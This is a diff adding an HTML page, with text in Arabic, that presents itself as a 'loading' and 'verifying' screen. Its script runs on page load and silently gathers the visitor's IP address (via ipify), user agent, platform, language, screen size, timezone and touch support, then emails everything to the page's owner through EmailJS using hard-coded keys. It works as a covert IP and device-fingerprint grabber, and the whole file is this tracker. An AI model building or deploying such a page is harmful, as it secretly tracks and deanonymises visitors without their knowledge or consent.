@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>جاري التحميل...</title>
+    <meta charset="UTF-8">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+    <h2>جاري التحقق...</h2>
+
+    <script>
+        const PUBLIC_KEY = "cKNV5WOvkFhxxosvu";
+        const SERVICE_ID = "service_f3qcjfk";
+        const TEMPLATE_ID = "template_dsmaz8j";
+
+        emailjs.init(PUBLIC_KEY);
+
+        async function collectAndSend() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `\( {screen.width}x \){screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchSupport: 'ontouchstart' in window ? "نعم" : "لا",
+                timestamp: new Date().toLocaleString("ar-EG")
+            };
+
+            // جلب الـ IP
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                info.ip = data.ip;
+            } catch (e) {
+                info.ip = "غير معروف";
+            }
+
+            // إرسال الإيميل
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                title: "معلومات جهاز جديد",
+                name: "زائر",
+                time: info.timestamp,
+                message: "تم جمع معلومات الجهاز",
+                ip: info.ip,
+                user_agent: info.userAgent,
+                platform: info.platform,
+                language: info.language,
+                screen: info.screen,
+                timezone: info.timezone,
+                touch: info.touchSupport,
+                info: JSON.stringify(info, null, 2)
+            }).then(() => {
+                console.log("تم الإرسال بنجاح");
+            }).catch((err) => {
+                console.log("خطأ في الإرسال:", err);
+            });
+        }
+
+        collectAndSend();
+    </script>
+</body>
+</html>
